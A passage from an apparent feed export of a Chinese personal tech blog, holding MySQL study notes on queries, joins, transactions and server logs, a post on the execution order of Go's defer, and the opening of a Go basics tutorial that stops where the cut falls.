title="聚集函数"></a>聚集函数</h5><ul><li>avg(col_name)</li><li>count(col_name)</li><li>max(col_name)</li><li>min(col_name)</li><li>sum(col_name)</li></ul><pre><code class="mysql">select * from tbl_name where date(col_name) between &#39;2020-01-01&#39; and &#39;2020-01-31&#39;;select * from tbl_name where year(col_name) = 2020 and month(col_name) = 1; -- 同上select num_1 mod num_2; -- 同 num_1 % num_2select avg(distinct col_name) as alias_name from tbl_name;select count(distinct col_name) from tbl_name where conditions;</code></pre><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><pre><code class="mysql">select col_name, count(*) from tbl_name group by col_name;select col_name, count(*) from tbl_name group by col_name with rollup; -- 最后一条记录输出汇总的数据，如 count(*) 的总和select col_name, count(*) as number from tbl_name group by col_name having conditions; -- 使用条件过滤分组select col_name, count(*) from tbl_name group by col_name with rollup having number &gt; 1; -- 条件为 count(*) 大于 1select col_name_1, count(*) as alias_name from tbl_name where condition_1 group by col_name_2 having condition_2;</code></pre><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><pre><code class="mysql">select col_name_1 from tbl_name where col_name_2 in (select col_name_2 from tbl_name where condition);select * from tbl_name where id &gt; (select 1+2); -- id &gt; 3</code></pre><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><h5 id="基础连接"><a href="#基础连接" class="headerlink" title="基础连接"></a>基础连接</h5><pre><code class="mysql">select tbl_name_1.col_name_1 from tbl_name_1, tbl_name_2 where tbl_name_1.col_name_2 = tbl_name_2.col_name_2 and condition; -- 使用完全限定列名查询多个表中的多个列select * from tbl_name_1 inner join tbl_name_2 on tbl_name_1.col_name = tbl_name_2.col_name where condition; -- 内连接，结果同上，返回限定列相同的多表交集</code></pre><h5 id="高级连接"><a href="#高级连接" class="headerlink" title="高级连接"></a>高级连接</h5><pre><code class="mysql">select * from tbl_name_1 as t1 inner join tbl_name_2 as t2 on t1.col_name = t2.col_name where condition; -- Table Alias，用户不可见select * from tbl_name_1 left outer join tbl_name_2 on  tbl_name_1.col_name = tbl_name_2.col_name where condition; -- 左外连接select col_name from tbl_name where condition_1 union select col_name from tbl_name where condition_2; -- 组合查询select col_name from tbl_name_1 where condition_1 union select col_name from tbl_name_2 where condition_2; -- 组合查询select col_name from tbl_name where condition_1 union all select col_name from tbl_name where condition_2; -- 不进行去重</code></pre><h4 id="全文查找"><a href="#全文查找" class="headerlink" title="全文查找"></a>全文查找</h4><p>MyISAM 支持全文本搜索，而 InnoDB 不支持。</p><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><pre><code class="mysql">insert into tbl_name values(value_1, value_2 ...);insert into tbl_name(col_name_1, col_name_2 ...) values(value_1, value_2 ...);insert into tbl_name(col_name_1, col_name_2 ...) values(value_1, value_2 ...), (value_a, value_b ...); -- 插入多行insert into tbl_name_1(col_name_1, col_name_2 ...) select col_name_1, col_name_2 ... from tbl_name_2; -- 查询 tbl_name_2 的数据 插入到 tbl_name_1</code></pre><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><pre><code class="mysql">update tbl_name set col_name_1 = value_1, col_name_2 = value_2 where condition; -- 多行操作出错整体回滚update ignore tbl_name set col_name_1 = value_1, col_name_2 = value_2 where condition; -- 多行操作出错继续</code></pre><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><pre><code class="mysql">delete from tbl_name where condition;truncate table tbl_name; -- 删除表内所有数据（更快的操作，实际是删除原表重建新表）</code></pre><h2 id="数据定义（DDL）"><a href="#数据定义（DDL）" class="headerlink" title="数据定义（DDL）"></a>数据定义（DDL）</h2><p><em>Data Definition Language</em></p><h3 id="表（Table）"><a href="#表（Table）" class="headerlink" title="表（Table）"></a>表（Table）</h3><h4 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h4><pre><code class="mysql">create table tbl_name (    uid int not null auto_increment,    username varchar(8) not null,    age int not null default 10,    primary key (uid)) engine=InnoDB;</code></pre><h4 id="更新-1"><a href="#更新-1" class="headerlink" title="更新"></a>更新</h4><pre><code class="mysql">alter table tbl_name add col_name int; -- 增加一个新列alter table tbl_name drop column col_name; -- 删除一个新列</code></pre><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><pre><code class="mysql">drop table tbl_name;</code></pre><h4 id="清空"><a href="#清空" class="headerlink" title="清空"></a>清空</h4><pre><code class="mysql">truncate table tbl_name; -- 创建一个空表，删除原表</code></pre><h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><pre><code class="mysql">rename table tbl_name to new_tbl_name;rename table tbl_name_1 to new_tbl_name_1, tbl_name_2 to new_tbl_name_2;</code></pre><h3 id="视图（View）"><a href="#视图（View）" class="headerlink" title="视图（View）"></a>视图（View）</h3><pre><code class="mysql">create view view_name as select col_name from tbl_name where condition; -- 创建视图select * from view_name where condition; -- 使用视图</code></pre><h2 id="存储过程（Stored-Procedure）"><a href="#存储过程（Stored-Procedure）" class="headerlink" title="存储过程（Stored Procedure）"></a>存储过程（Stored Procedure）</h2><h3 id="创建-2"><a href="#创建-2" class="headerlink" title="创建"></a>创建</h3><pre><code class="mysql">create procedure procedure_name()begin    select ... from ... ;end;</code></pre><pre><code class="mysql">create procedure procedure_name(    out name_1 decimal(8,2), -- out 将形参传回实参    in name_2 int -- in 将实参传给形参    -- inout 实参传入形参，并由形参改变实参)begin    select ...    from ...    where name_2 = ...    into name_1; -- 将查询结果存入 name_1end;</code></pre><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><pre><code class="mysql">call procedure_name();call procedure_name(@var_1, 2000); -- out 用来接收，in 传入select @var_1; -- 获取变量值</code></pre><h3 id="删除-2"><a href="#删除-2" class="headerlink" title="删除"></a>删除</h3><pre><code class="mysql">drop procedure procedure_name;</code></pre><h2 id="游标（Cursor）"><a href="#游标（Cursor）" class="headerlink" title="游标（Cursor）"></a>游标（Cursor）</h2><pre><code class="mysql">create procedure procedure_name()begin    -- Declare local variables    declare var_1 int;    -- Declare the cursor    declare cursor_name cursor    for    select ... from ... ;    -- Open the cursor    open cursor_name;    -- Query    fetch cursor_name into var_1; -- 将查询结果存入 var_1    -- Close the cursor    close cursor_name;    -- Reopen the cursor    open cursor_name;end; -- 未关闭的 cursor 在 end 时隐含关闭</code></pre><h2 id="触发器（Trigger）"><a href="#触发器（Trigger）" class="headerlink" title="触发器（Trigger）"></a>触发器（Trigger）</h2><h2 id="事务（Transaction）"><a href="#事务（Transaction）" class="headerlink" title="事务（Transaction）"></a>事务（Transaction）</h2><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><pre><code class="mysql">select ... from ... where ... ;start transaction; -- 开启事务delete from ... where ... ;insert into ... values( ... );rollback; -- 回滚，事务自动关闭select ... from ... where ... ;</code></pre><h3 id="Commit"><a href="#Commit" class="headerlink" title="Commit"></a>Commit</h3><pre><code class="mysql">start transaction;...commit; -- 如果事务语句存在错误会被自动撤销，事务自动关闭</code></pre><h3 id="Savepoint"><a href="#Savepoint" class="headerlink" title="Savepoint"></a>Savepoint</h3><pre><code class="mysql">savepoint sp_name; -- 当前状态rollback to sp_name; -- 回滚到 sp_name 检查点</code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h3><h4 id="INT-amp-CHAR"><a href="#INT-amp-CHAR" class="headerlink" title="INT &amp; CHAR"></a>INT &amp; CHAR</h4><ol><li>当<strong>查询字段</strong>是 <code>INT</code> 类型，如果<strong>查询条件</strong>为 <code>CHAR</code>，将<strong>查询条件</strong>转换为 <code>INT</code>，如果是字符串前导都是数字，将截取前导数字用来比较，如果没有前导数字，则转换为 <code>0</code>。</li><li>当<strong>查询字段</strong>是 <code>CHAR/VARCHAR</code> 类型，如果<strong>查询条件</strong>为 <code>INT</code>，将<strong>查询字段</strong>为换为 <code>INT</code> 再进行比较，可能会<strong>造成全表扫描</strong>。</li></ol><h2 id="MySQL-服务器"><a href="#MySQL-服务器" class="headerlink" title="MySQL 服务器"></a>MySQL 服务器</h2><h3 id="服务器日志"><a href="#服务器日志" class="headerlink" title="服务器日志"></a>服务器日志</h3><p>MySQL 中有以下几种日志文件：</p><ul><li>错误日志（Error log）</li><li>通用查询日志（Ggeneral query log）</li><li>慢查询日志（Slow query log）</li><li>中继日志（Relay log）</li><li>DDL 日志 (Metadata log)</li><li>二进制日志（binary log）</li></ul><p>默认情况下，除了 Windows 上的错误日志外，不启用任何日志。（DDL 日志总是在需要时创建，并且没有用户可配置的选项。）</p><h4 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h4><p>错误日志记录了 MySQL（<a href="https://dev.mysql.com/doc/refman/5.7/en/mysqld.html"><strong>mysqld</strong></a>）启动、运行、关闭过程中遇到的各种问题。可通过 <code>show variables like &#39;log_error&#39;\G;</code> 命令查看其位置。</p><h4 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h4><p>慢查询日志主要用于得出一些有用的优化信息，MySQL 会把执行时间超过（不包括等于）设定阈值（<code>long_query_time</code>）的查询语句记录下来。通过 <code>show variables like &#39;long_query_time&#39;\G;</code> 可查询这个阈值，默认是 10 秒。可通过 <code>show variables like &#39;slow_query_log&#39;\G;</code> 查看是否开启了慢查询日志。</p><h4 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h4><p>通用查询日志记录了所有<strong>已建立的客户端连接</strong>和<strong>从客户端收到的语句</strong>，通过 <code>show variables like &#39;general_log%&#39;\G;</code> 命令可以查看与其相关的两个变量：<code>general_log</code> 指定是否开启通用日志，<code>general_log_file</code> 指定了通用日志的文件位置。</p><h4 id="DDL-日志"><a href="#DDL-日志" class="headerlink" title="DDL 日志"></a>DDL 日志</h4><p>DDL 日志记录了 DDL 语句执行的元数据操作。</p><h4 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h4><p>这其中最需要重点学习的日志是二进制日志，简称 binlog，包含描述数据库更改的“事件”，例如表创建操作以及表数据的更改。如果没有使用使用<strong>基于行的日志记录</strong>的话，它还会包含<strong>可能进行更改</strong>的语句事件（例如，不匹配任何行的 <code>DELETE</code> 语句，即便没起作用也会被记录）。binlog 还包含每个语句花费了多长时间去更新数据的信息。</p><p>binlog 有两个重要目的：</p><ul><li>主从复制（replication），主服务器上的 binlog 提供了要发送到从服务器的数据更改记录。主服务器将其 binlog 中包含的事件发送到从服务器，从服务器执行这些事件以进行与主服务器相同的数据更改。</li><li>某些数据恢复（recovery）操作需要使用 binlog。恢复备份后，将重新执行备份后记录的 binlog 中的事件。这些事件使数据库从备份点开始更新。</li></ul><p>binlog 不用于 <code>SELECT</code> 或 <code>SHOW</code> 等不修改数据的语句。要记录所有语句请使用通用查询日志。</p><p>启用 binlog 会使性能稍微变低。但是，binlog 对于主从复制和恢复操作方面的益处通常远超过这种轻微的性能下降。</p><p>binlog 是 Server 层的日志，由 MySQL 实现，所有引擎都可用。binlog 是逻辑日志，记录的是语句的原始逻辑，比如给某个行的某字段加一这个操作。binlog 文件写到一定大小之后，会切换到下一个 binlog 文件，不会覆盖原来的日志文件。</p>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文是对 MySQL 的学习总结，包含 MySQL 数据库系统的基础知识。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Database" scheme="https://blog.secriy.com/tags/Database/"/>
    
    <category term="MySQL" scheme="https://blog.secriy.com/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Go Learning: defer</title>
    <link href="https://blog.secriy.com/go-defer/"/>
    <id>https://blog.secriy.com/go-defer/</id>
    <published>2021-04-20T15:12:29.000Z</published>
    <updated>2025-02-16T07:13:36.763Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文是 Golang 中 <code>defer</code> 语句的学习和深入理解。</p></div><span id="more"></span><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="一、有关-defer-的执行顺序"><a href="#一、有关-defer-的执行顺序" class="headerlink" title="一、有关 defer 的执行顺序"></a>一、有关 <code>defer</code> 的执行顺序</h3><p>程序执行到 <code>defer</code> 语句时，并不会直接执行 <code>defer</code> 后的语句，而是将其存入该函数的栈中，等待最后函数返回后出栈执行，因此当多个 <code>defer</code> 出现的时候，执行顺序遵循 FILO。</p><h3 id="二、defer-和-return-执行的先后"><a href="#二、defer-和-return-执行的先后" class="headerlink" title="二、defer 和 return 执行的先后"></a>二、<code>defer</code> 和 <code>return</code> 执行的先后</h3><p>同时包含 <code>defer</code> 和 <code>return</code> 语句的函数执行顺序如下：</p><ol><li><code>defer</code> 语句顺序入栈。</li><li><code>return</code> 语句执行，设置返回值。</li><li><code>defer</code> 语句出栈执行。</li><li>程序携返回值退出。</li></ol><h3 id="三、defer-和-panic-执行的先后"><a href="#三、defer-和-panic-执行的先后" class="headerlink" title="三、defer 和 panic 执行的先后"></a>三、<code>defer</code> 和 <code>panic</code> 执行的先后</h3><p>当程序进入 <code>panic</code> 后，首先立即执行所有的 <code>defer</code>，接着执行 <code>panic</code>，最后将 <code>panic</code> 状态上溯至包含其的所有函数，直到结束整个 goroutine。</p><p>示例：</p><pre><code class="go">func main() &#123;    f1()&#125;func f1() &#123;    defer println(&quot;f1-begin&quot;)    f2()    defer println(&quot;f1-end&quot;)&#125;func f2() &#123;    defer println(&quot;f2-begin&quot;)    f3()    defer println(&quot;f2-end&quot;)&#125;func f3() &#123;    defer println(&quot;f3-begin&quot;)    panic(0)    defer println(&quot;f3-end&quot;)&#125;</code></pre><p>上述代码的执行顺序如下：</p><ol><li>从 <code>main.main()</code> 进入，执行 <code>f1()</code>。</li><li><code>println(&quot;f1-begin&quot;)</code> 入栈，执行 <code>f2()</code>。</li><li><code>println(&quot;f2-begin&quot;)</code> 入栈，执行 <code>f3()</code>。</li><li><code>println(&quot;f3-begin&quot;)</code> 入栈，触发 <code>panic(0)</code>。</li><li>执行当前函数内所有 <code>defer</code> 语句，<code>println(&quot;f3-begin&quot;)</code> 出栈执行，<code>panic f3()</code>。</li><li><code>panic</code> 向上执行至 <code>f2()</code>，同理 <code>println(&quot;f2-begin&quot;)</code> 出栈执行，<code>panic f2()</code>。</li><li><code>panic</code> 向上执行至 <code>f1()</code>，同理 <code>println(&quot;f1-begin&quot;)</code> 出栈执行，<code>panic f1()</code>。</li><li><code>panic</code> 向上执行至 <code>main.main()</code>，<code>panic main.main()</code>，退出该 Goroutine。</li></ol><h3 id="四、defer-中包含子函数"><a href="#四、defer-中包含子函数" class="headerlink" title="四、defer 中包含子函数"></a>四、<code>defer</code> 中包含子函数</h3><p>当 <code>defer</code> 语句中的函数包含子函数调用时，由于需要 Push Stack 操作，存入函数地址和实参，因此 Push Stack 操作前会先执行子函数返回。</p><p>示例：</p><pre><code class="go">func f(index int, value int) int &#123;    fmt.Println(index)    return index&#125;func main() &#123;    defer f(1, f(3, 0))    defer f(2, f(4, 0))&#125;</code></pre><p>执行流程：</p><ol><li>从 <code>main.main()</code> 进入</li><li><code>f(1, f(3, 0))</code> 准备入栈，执行 <code>f(3, 0)</code>，输出 3，将函数地址和参数一并入栈。</li><li><code>f(2, f(4, 0))</code> 准备入栈，执行 <code>f(4, 0)</code>，输出 4，将函数地址和参数一并入栈。</li><li><code>f(2, f(4, 0))</code> 出栈执行，输出 2。</li><li><code>f(1, f(3, 0))</code> 出栈执行，输出 1。</li></ol>]]></content>
    
    
    <summary type="html">&lt;div class=&quot;note quote cyan&quot;&gt;&lt;p&gt;本文是 Golang 中 &lt;code&gt;defer&lt;/code&gt; 语句的学习和深入理解。&lt;/p&gt;&lt;/div&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://blog.secriy.com/categories/note/"/>
    
    
    <category term="Go" scheme="https://blog.secriy.com/tags/Go/"/>
    
    <category term="PL" scheme="https://blog.secriy.com/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>Learn Go</title>
    <link href="https://blog.secriy.com/learn-go/"/>
    <id>https://blog.secriy.com/learn-go/</id>
    <published>2021-04-17T01:16:22.000Z</published>
    <updated>2025-02-16T07:13:36.768Z</updated>
    
    <content type="html"><![CDATA[<div class="note quote cyan"><p>本文是 Golang 的基础学习笔记，大多是对 <a href="https://tour.golang.org/"><em>A Tour of Go</em></a> 的翻译总结，并参考了 <a href="http://www.gopl.io/"><em>The Go Programming Language</em></a> 的部分内容自行实现了相关代码并对知识点进行了梳理。</p></div><span id="more"></span><blockquote><p>写作环境：<code>go version go1.17 windows/amd64</code></p></blockquote><h2 id="命令行操作"><a href="#命令行操作" class="headerlink" title="命令行操作"></a>命令行操作</h2><p>Golang 提供了完整的操作命令，用于管理和操作项目。配置好 Golang 环境后，可以直接输入 <code>go</code> 命令查看 Golang 提供的所有命令：</p><table><thead><tr><th align="center">command</th><th align="left">info</th></tr></thead><tbody><tr><td align="center">bug</td><td align="left">start a bug report</td></tr><tr><td align="center">build</td><td align="left">compile packages and dependencies</td></tr><tr><td align="center">clean</td><td align="left">remove object files and cached files</td></tr><tr><td align="center">doc</td><td align="left">show documentation for package or symbol</td></tr><tr><td align="center">env</td><td align="left">print Go environment information</td></tr><tr><td align="center">fix</td><td align="left">update packages to use new APIs</td></tr><tr><td align="center">fmt</td><td align="left">gofmt (reformat) package sources</td></tr><tr><td align="center">generate</td><td align="left">generate Go files by processing source</td></tr><tr><td align="center">get</td><td align="left">add dependencies to current module and install them</td></tr><tr><td align="center">install</td><td align="left">compile and install packages and dependencies</td></tr><tr><td align="center">list</td><td align="left">list packages or modules</td></tr><tr><td align="center">mod</td><td align="left">module maintenance</td></tr><tr><td align="center">run</td><td align="left">compile and run Go program</td></tr><tr><td align="center">test</td><td align="left">test packages</td></tr><tr><td align="center">tool</td><td align="left">run specified go tool</td></tr><tr><td align="center">version</td><td align="left">print Go version</td></tr><tr><td align="center">vet</td><td align="left">report likely mistakes in packages</td></tr></tbody></table><p>使用 <code>go help &lt;command&gt;</code> 查询某个命令的详细信息：</p><pre><code class="shell">go help build</code></pre><pre><code>usage: go build [-o output] [build flags] [packages]...</code></pre><h3 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h3><blockquote><p>只对常用命令的简单用法进行介绍，详细使用方法需要参照命令行提示信息。</p></blockquote><h4 id="build"><a href="#build" class="headerlink" title="build"></a>build</h4><p>该命令用于编译包和依赖，如果是使用了 Go Modules 的项目，编译时会自动根据 <em>go.mod</em> 文件获取依赖包，再进行编译。</p><h5 id="普通编译"><a href="#普通编译" class="headerlink" title="普通编译"></a>普通编译</h5><p>编译整个目录：</p><pre><code class="shell">go build</code></pre><p>指定输出的文件名：</p><pre><code class="shell">go build -o hello.exe</code></pre><p>指定入口编译：</p><pre><code class="shell">go build main.go</code></pre><h5 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h5><p>Golang 支持在很多环境下编译运行，使用<code>go tool dist list</code>命令可以查看 Golang 支持的平台：</p><pre><code class="shell">go tool dist list</code></pre><pre><code>aix/ppc64android/386android/amd64android/armandroid/arm64darwin/amd64...</code></pre><p>很多时候需要跨系统环境编译，比如在 Windows 下开发可能需要编译 Linux 可以使用的可执行版本，这时候就需要交叉编译：</p><ol><li><p>Windows 下编译</p><p>Windows 下需要使用批处理命令，新建一个<em>build.bat</em>文件，填入编译命令执行即可。</p><pre><code class="shell"># MacOSSET CGO_ENABLED=0SET GOOS=darwinSET GOARCH=amd64go build main.go# LinuxSET CGO_ENABLED=0SET GOOS=linuxSET GOARCH=amd64go build main.go</code></pre></li><li><p>Linux 下编译</p><pre><code class="shell"># MacOSCGO_ENABLED=0 GOOS=darwin  GOARCH=amd64  go build main.go# WindowsCGO_ENABLED=0 GOOS=windows  GOARCH=amd64  go build main.go</code></pre></li><li><p>MacOS 下编译</p><pre><code class="shell"># LinuxCGO_ENABLED=0  GOOS=linux  GOARCH=amd64  go build main.go# WindowsCGO_ENABLED=0 GOOS=windows  GOARCH=amd64  go  build  main.go</code></pre></li></ol><h6 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h6><ul><li>CGO_ENABLED：该参数默认为 1，即默认开启 CGO，允许在 Golang 中调用 C 代码，开启之后编译时部分包会使用 C 的实现，因而存在外部依赖（动态链接）。当该参数设置为 0，即禁用 CGO 后，编译时就不会使用 C 实现，从而编译出纯静态的可执行文件</li><li>GOOS：即目标平台</li><li>GOARCH：即目标平台的体系架构</li></ul><h4 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h4><p>从包源码目录中移除对象文件，例如编译生成的二进制文件以及由其他工具生成的各种文件和目录。</p><h4 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h4><p>利用格式化的注释生成文档。</p><h4 id="env"><a href="#env" class="headerlink" title="env"></a>env</h4><p>查询 <code>golang</code> 的环境变量配置。</p><h4 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h4><p>将包中使用的 API 更新为新版本用法，与 <code>go tool fix</code> 等同。</p><h4 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h4><p>格式化源码风格，是对<strong>gofmt</strong>工具进行的封装，与 <code>gofmt -l -w</code> 等同。</p><h4 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h4><p>根据代码中的格式化注释来在执行编译过程。</p><p>注释格式如下：</p><pre><code class="go">//go:generate command argument...</code></pre><p>使用<code>go generate</code>命令时会自动执行上述注释中的代码。</p><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>该命令用于动态获取远程代码包及其所有依赖包，并进行编译安装。默认会将其下载到 GOPATH 下的 src 目录。</p><h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><p>该命令与<code>go build</code>类似，区别是<code>go install</code>会将编译后的可执行文件放到指定的目录（即<strong>$GOBIN</strong>文件夹），当<strong>$GOBIN</strong>环境变量未设置时执行<code>go install</code>会报错。</p><h4 id="list"><a href="#list" class="headerlink" title="list"></a>list</h4><p>该命令用于列出包名和模块名。</p><h4 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h4><p>该命令用于管理 Golang 的包，自 Go1.11 开始启用，实现 Modules 管理。将环境变量 <strong>$GO111MODULE</strong> 设置为 on 或 auto 打开（未来会删除，默认启用 Go Modules）。</p><h5 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h5><ul><li><p><code>go mod init [package name]</code>：初始化 Go Modules 项目</p></li><li><p><code>go mod download [modules name]</code>：下载指定的模块</p></li><li><p><code>go mod tidy</code>：自动添加缺失的模块并移除未使用的模块</p></li></ul><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>编译并运行 Golang 程序。</p><p>用法：</p><pre><code class="shell">go run [build flags] [-exec xprog] package [arguments...]</code></pre><h4 id="test"><a href="#test" class="headerlink" title="test"></a>test</h4><p>进行单元测试和性能测试。</p><h4 id="tool"><a href="#tool" class="headerlink" title="tool"></a>tool</h4><p>运行 Golang 提供的工具。</p><h4 id="version"><a href="#version" class="headerlink" title="version"></a>version</h4><p>查询 Golang 版本。</p><h4 id="vet"><a href="#vet" class="headerlink" title="vet"></a>vet</h4><p>用于报告包中可能存在的错误，分析当前包中的代码是否正确，等同于<code>go tool vet</code>。</p><h2 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h2><h3 id="命名"><a href="#命名" class="headerlink" title="命名"></a>命名</h3><p>Go 语言中的函数名、变量名、常量名、类型名、语句标号和包名等所有的命名，都遵循一个简单的命名规则：一个名字必须以一个字母（Unicode 字母）或下划线开头，后面可以跟任意数量的字母、数字或下划线。大写字母和小写字母是不同的：heapSort 和 Heapsort 是两个不同的名字。</p><p>Go 的全部关键字如下：</p><pre><code class="go">break      default       func     interface   selectcase       defer         go       map         structchan       else          goto     package     switchconst      fallthrough   if       range       typecontinue   for           import   return      var</code></pre><p>以上所有关键字都不能用来命名。</p><p>Go 的内建常量、内建类型、内建函数如下：</p><pre><code class="go">// 内建常量:true false iota nil// 内建类型:int int8 int16 int32 int64uint uint8 uint16 uint32 uint64 uintptrfloat32 float64 complex128 complex64bool byte rune string error// 内建函数:make len cap new append copy close deletecomplex real imagpanic recover</code></pre><p>上面的这些内建常量、类型和函数名可以被用来命名其他东西，但是在某些时候会出现冲突（同一作用域下）。</p><p>Go 的命名习惯为驼峰式命名。例如 <code>quickSort</code>、<code>SetName</code> 等。</p><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>每一个 Go 程序都是由包（package）组成的，程序从<code>main</code>包开始运行。</p><p>根据惯例，包名通常是导入路径的最后一段，例如<code>math/rand</code>包中的每个 go 文件都是以<code>rand</code>为包名。</p><p>每个 go 文件的开头都必须指定所属的包，例如<code>package main</code>，指定其属于<code>main</code>包：</p><pre><code class="go">package main</code></pre><p>在包声明之后，需要导入当前 go 程序所使用的其他包：</p><pre><code class="go">import &quot;fmt&quot; // 导入fmt包</code></pre><p>当引入了多个包时，需要全部导入：</p><pre><code class="go">import &quot;fmt&quot;import &quot;sync&quot;</code></pre><p>通常会将这些包分组导入：</p><pre><code class="go">import (    &quot;fmt&quot;    &quot;sync&quot;)</code></pre><p>可以给导入的包一个别名，操作包变量及包函数时可以使用别名：</p><pre><code class="go">import f &quot;fmt&quot;func main() &#123;    f.Println(&quot;Hello World&quot;)&#125;</code></pre><p>使用<code>.</code>导入包可以省略包名调用包内实体：</p><pre><code class="go">import . &quot;math&quot;func main() &#123;    x := Sqrt(6) // 原为 math.Sqrt()    fmt.Println(x)&#125;</code></pre><p>当导入包却不使用时，可以用<code>_</code>作为包的别名（当只需要调用包的<code>init</code>函数和包级变量时会这么做，后面会讲到）：</p><pre><code class="go">import _ &quot;fmt&quot;</code></pre><p>如果常规导入包却没有显式使用，编译器会报错，无法通过编译。</p><p>Golang 区分大小写，并使用大小写区分导出变量（常量、函数、接口等）和私有变量（常量、函数、接口等），类似于 Java 中的 public 和 private。首字母大写的数据类型可以被其他包访问和调用（Public），而首字母小写只能在包内使用（Private）。</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;math&quot;)func main() &#123;    fmt.Println(math.pi) // 导出名首字母大写，因此这段代码会报错，将pi改为Pi即可&#125;</code></pre><h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>Golang 程序中 <code>main</code> 包的 <code>main</code> 函数作为其入口，在执行 <code>main</code> 函数之前会先执行 <code>init</code> 函数：</p><pre><code class="go">package mainvar a intfunc init() &#123;    a = 23&#125;func main() &#123;    fmt.Println(a) // 23&#125;</code></pre><p>因此在实际编程时常常在 <code>init</code> 函数内进行一些初始化操作，例如读取配置文件等。</p><h3 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h3><p>Golang 中包含多种数据类型，并提供了确定的类型长度，方便在不同系统环境下的移植：</p><pre><code>bool // 布尔值string // 字符串int  int8  int16  int32  int64            // 有符号整数uint uint8 uint16 uint32 uint64 uintptr // 无符号整数byte // uint8 的别名rune // int32 的别名，代表一个 Unicode 码点float32 float64 // 浮点数complex64 complex128 // 复数</code></pre><p>其中，<code>int</code>、<code>uint</code>、<code>uintptr</code> 类型的大小会随位宽的不同而不同，比如在 32 位环境下，它们都占 32bit，而在 64 位环境下它们会占 64bit。</p><h3 id="自定义类型"><a href="#自定义类型" class="headerlink" title="自定义类型"></a>自定义类型</h3><p>Golang 支持自定义类型，使用 <code>type</code> 关键字指定，并要求指定其底层类型：</p><pre><code class="go">type MyTypeA inttype MyTypeB string</code></pre><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>变量（Varrible）是编程语言中最基本的量，基本的变量操作有”声明“、”定义“、”初始化“和”赋值“四种。</p><ul><li><strong>声明（declare）</strong>：告诉编译器/解析器这个变量的存在，但不分配内存空间</li><li><strong>定义（defined）</strong>：为变量分配内存空间，在某些语言（如 C）中声明就包含了定义的过程</li><li><strong>初始化（initialize）</strong>：定义变量后，系统并不知道要为该变量分配多少内存空间，通常是使用默认的大小，初始化过程就对变量进行了内存空间的确定</li><li><strong>赋值（assign）</strong>：在变量分配内存空间后，对变量的值进行修改</li></ul><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><p>在 Golang 中，变量的声明就包含了定义和初始化的过程，需要指定变量类型：</p><pre><code class="go">var a intfmt.Println(a) // 0var b, c int // 同时声明多个同类型变量fmt.Println(b) // 0fmt.Println(c) // 0var d boolfmt.Println(d) // false</code></pre><p>变量声明时会根据类型自动初始化，默认是二进制的零值，因此<code>int</code>类型的初始值是<code>0</code>，<code>bool</code>类型的初始值是<code>false</code>，<code>string</code>类型的初始值是<code>&quot;&quot;</code>。</p><p>存在声明但未使用的变量会导致编译错误：</p><pre><code class="go">package mainfunc main() &#123;    var a int&#125;</code></pre><pre><code>xxx\main.go:4:6: a declared but not used</code></pre><h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>使用<code>=</code>来对变量进行赋值：</p><pre><code class="go">var a inta = 12</code></pre><p>使用元组赋值可以对多个变量进行赋值：</p><pre><code class="go">var a, b inta, b = 1, 2// a = 1// b = 2</code></pre><p>利用元组赋值可以进行变量值的交换：</p><pre><code class="go">var a, b inta, b = 1, 2a, b = b, a// a = 2// b = 1</code></pre><h4 id="初始化"><a href="#初始化" class="headerlink" 